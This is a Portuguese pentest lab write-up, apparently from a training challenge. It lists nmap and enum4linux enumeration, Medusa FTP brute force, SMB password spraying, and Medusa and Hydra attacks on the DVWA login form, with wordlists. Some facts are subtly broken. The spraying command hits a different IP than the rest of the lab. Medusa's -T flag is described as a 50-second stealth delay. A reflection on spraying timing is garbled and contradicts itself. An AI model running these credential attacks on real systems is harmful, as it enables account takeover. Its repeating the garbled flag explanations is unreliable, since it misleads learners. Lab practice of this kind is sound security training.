# Desafio 1 — Pentest de rede e aplicação web

Desafio de autenticação e enumeração aplicados a uma máquina virtual com serviços expostos (FTP, SSH, HTTP, SMB e NetBIOS) e uma aplicação web vulnselha (DVWA). O objetivo: registrar a cadeia de ataque, enumerar a vítima, tentar conquista de credenciais por força bruta e password spraying, e registrar as reflexões do processo.

---

## 1. Reconhecimento (Recon)

### 1.1 Verificação de conectividade com a VM

```bash
ping -c 3 192.168.56.101
```

- **`-c 3`**: quantidade de pacotes ICMP (echo-request) a enviar. Com `-c 3`, o ping envia 3 pacotes e para sozinho. Sem `-c`, o ping roda infinitamente (até `Ctrl+C` no Linux).
- No Windows, o `ping` padrão envia 4 pacotes; o `-c` controla esse número em qualquer sistema.

### 1.2 Enumeração de portas e versões de serviços

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

- **`-sV`**: tenta identificar a versão dos serviços rodando nas portas.
- **`-p 21,22,80,445,139`**: escaneia as portas FTP (21), SSH (22), HTTP (80), SMB (445) e NetBIOS (139).

---

## 2. Força Bruta — FTP

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

- **`-h`**: host alvo.
- **`-U`**: arquivo com a lista de usuários.
- **`-P`**: arquivo com a lista de senhas.
- **`-M ftp`**: módulo FTP do Medusa.
- **`-t 6`**: 6 threads simultâneas.

---

## 3. Password Spraying — SMB/NetBIOS

### 3.1 Coleta de informações

```bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

- **`-a`**: executa todas as opções de enum4linux (enum completo).
- **`tee`**: salva a saída no arquivo `enum4_output.txt` e também mostra no terminal.

### 3.2 Visualização do arquivo

```bash
less enum4_output.txt
```

> ⚠️ **Correção:** a saída do `tee` criou `enum4_output.txt` (com sublinhado). O `less` original usava `enum4output.txt` (sem sublinhado). O nome correto é `enum4_output.txt`.

### 3.3 Criação de wordlists

Usuários:

```bash
echo -e "usr\nmsfadmin\nservice" > smb_users.txt
```

- **`-e`**: interpreta sequências de escape (`\n` = nova linha).
- **`>`**: redireciona a saída para `smb_users.txt`, sobrescrevendo (ou criando) o arquivo.

Senhas:

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senham.txt
```

> ⚠️ **Correção:** o comando original terminava no meio da aspas. Com o fechamento `" > senham.txt`, o shell grava a lista no arquivo. Veja `senham.txt` neste repositório.

### 3.4 Password spraying no serviço SMBNT

```bash
medusa -h 192.168.56.191 -U smb_users.txt -P senham.txt -M smbnt -t 2 -T 50
```

- **`-t 2`**: 2 threads simultâneas.
- **`-T 50`**: intervalo de 50 segundos entre tentativas. Esse atraso é essencial no password spraying: evita bloqueio de conta e reduz a chance de detecção, pois o ataque "espalha" ao longo do tempo.

---

## 4. Força Bruta em Aplicação Web (DVWA)

### 4.1 Medusa (módulo web-form)

```bash
medusa -u admin -P pass.txt -h 127.0.0.1 \
-M web-form \
-m FORM:"/dvwa/vulnerabilities/brute/" \
-m DENY-SIGNAL:"Username and/or password incorrect." \
-m form-data:'username=^USER^&password=^PASS^&Login=Login' \
-m CUSTOM-HEADER:"Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774"
```

> ⚠️ **Correção:** o parâmetro original era `-m form-data:'get?username=&password=&Login=Login'`. O prefixo `get?` indicava uma URL GET, mas o módulo `web-form` do Medusa envia dados via **POST** (body). O correto é passar o body do formulário com placeholders `^USER^` e `^PASS^`:
>
> ```bash
> -m form-data:'username=^USER^&password=^PASS^&Login=Login'
> ```
>
> - **`-u admin`**: usuário a ser testado.
> - **`-M web-form`**: módulo web-form.
> - **`-m FORM:"..."`**: caminho do formulário no DVWA.
> - **`-m DENY-SIGNAL:"..."`**: string de erro que significa falha de login (para o Medusa reconhecer uma tentativa reprovada).
> - **`-m form-data:'...'`**: body do POST com placeholders `^USER^` e `^PASS^`.
> - **`-m CUSTOM-HEADER:"..."`**: cabeçalho personalizado (sessão PHP do DVWA).

### 4.2 Hydra (http-get-form)

```bash
hydra -l admin -P pass.txt 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low':F=Username and/or password incorrect."
```

> ⚠️ **Correção:** o cabeçalho original `H=Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low` continha um `;`, que o Hydra interpretava como separador de opções — `security=low` viraria uma opção inválida e a tentativa falhava. Corrigido usando aspas para agrupar o valor:
>
> ```bash
> :username=^USER^&password=^PASS^&Login=Login:H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low':F=Username and/or password incorrect.
> ```
>
> - **`-l admin`**: usuário único (login).
> - **`-P pass.txt`**: lista de senhas.
> - **`http-get-form`**: método HTTP + formulário.
> - **`/dvwa/vulnerabilities/brute/`**: endpoint.
> - **`username=^USER^&password=^PASS^&Login=Login`**: campos do formulário; `^USER^` e `^PASS^` são substituídos dinamicamente.
> - **`H='...'`**: cabeçalhos; o `;` está agrupado dentro das aspas.
> - **`F=...`**: string de falha (para o Hydra reconhecer um login incorreto).

---

## 5. Wordlists

### 5.1 `usuariom.txt`

```text
msfadmin
admin
administrator
root
user
guest
test
teste
ubuntu
kali
debian
metasploitable
postgres
mysql
ftp
ftpuser
www-data
apache
nginx
tomcat
oracle
backup
support
suporte
operator
sysadmin
webadmin
dbadmin
security
developer
dev
service
manager
student
demo
```

### 5.2 `senham.txt`

```text
msfadmin
admin
administrator
root
password
password123
123456
12345678
123456789
1234567890
12345
123123
1234
111111
000000
qwerty
qwerty123
abc123
admin123
admin1234
root123
toor
letmein
welcome
welcome123
guest
guest123
test
test123
teste123
changeme
default
pass123
senha123
12345678910
```

---

## 6. Reflexões

1. **O `-c` no `ping` controla a quantidade de pacotes.** Ele é essencial para não deixar o `ping` rodando para sempre; em ambientes de reconhecimento, `ping -c 3` é o padrão.
2. **A enumeração revela a superfície de ataque.** O `nmap -sV -p 21,22,80,445,139` mostra quais serviços estão abertos e em qual versão, o que direciona o uso dos módulos corretos do Medusa.
3. **Força bruta (FTP) é direta e rápida.** O Medusa com `-t 6` testa usuário × senha em paralelo. O alvo era frágil quando exporia credenciais reais no `users.txt` (ex.: `msfadmin`).
4. **Password spraying depends on tempo.** O `-T 50` no SMBNT é decisivo: a "neve branca" (spray) só funciona se o ataque não for descoordenado; a expectativa de milissegundos entre tentativas quebra padrões de detecção.
5. **O `form-data` do Medusa deve ser o body do POST**, não o caminho GET. O placeholder `^USER^`/`^PASS^` é o ponto que faz o Medusa substituir o usuário e a senha a cada tentativa.
6. **Cabeçalhos com `;` exigem aspas.** No Hydra, o `;` separa opções; agrupar o valor do header entre aspas (`H='...'`) evita que `security=low` seja lido como parâmetro independente.
7. **A qualidade da wordlist é mais importante que o tamanho.** A lista de senhas usada aqui mistura gerais (`123456`, `password`) e plausíveis para o cenário (`msfadmin`, `Welcome123`).
8. **Sempre documentar o processo.** Registrar o comando, a saída e o erro corrigido deixa o repositório útil para reexecução e treinamento.
